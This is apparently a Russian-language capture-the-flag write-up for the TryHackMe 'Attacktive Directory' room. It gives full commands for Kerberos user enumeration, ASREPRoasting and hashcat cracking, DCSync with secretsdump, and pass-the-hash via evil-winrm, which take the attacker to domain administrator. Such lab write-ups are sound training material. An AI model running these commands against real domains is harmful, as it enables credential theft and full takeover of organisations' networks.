# Attacktive Directory: ASREPRoast → DCSync за один вечер

**Машина:** [Attacktive Directory](https://tryhackme.com/room/attacktivedirectory) (medium, Windows AD)
**Цепочка:** kerbrute userenum → ASREPRoast → шара backup → secretsdump (DCSync) → pass-the-hash.

## Разведка

nmap показывает полный набор доменного контроллера: 53, 88 (Kerberos), 135, 139, 445, 3389 и куча RPC-портов. Домен — `spookysec.local`, заносим в `/etc/hosts`.

## Юзеры через Kerberos

Учётки не гуессятся, но Kerberos сам говорит, существует ли юзер. kerbrute перебирает список имён по KDC:

```bash
kerbrute userenum -dc <ip> -d spookysec.local userlist.txt
```

Из найденных двоих выделяется `svc-admin`.

## ASREPRoast

Если у аккаунта стоит «Does not require Pre-Authentication», KDC отдаёт TGT без пароля — хэш можно брутить офлайн:

```bash
python3 GetNPUsers.py -no-pass -usersfile users.txt -dc-ip <ip> spookysec.local/
hashcat -m 18200 hash.txt passwordlist.txt
```

Хэш svc-admin ломается словарём из комнаты.

## От юзера — до всего домена

Под svc-admin смотрим шары (`smbclient -L`), в нестандартной шаре `backup` лежит текстовик с кредами юзера `backup`. А у backup есть золотое право: репликация каталога. Это значит DCSync — выкачать хэши всех учёток домена:

```bash
python3 secretsdump.py spookysec.local/backup:<pass>@<ip>
# метод: DRSUAPI, в выдаче — хэш Administrator
evil-winrm -i <ip> -u Administrator -H <hash>
```

Pass-the-hash, evil-winrm, флаги с десктопов трёх юзеров.

## Заметка

Классическая «дорожная карта AD» в миниатюре: enum юзеров → roast → DCSync. Одна ошибка конфигурации (pre-auth off) ведёт к полному домену, потому что дальше всё едет по инерции. Именно поэтому ASREPRoast — первое, что я проверяю на любом новом домене.
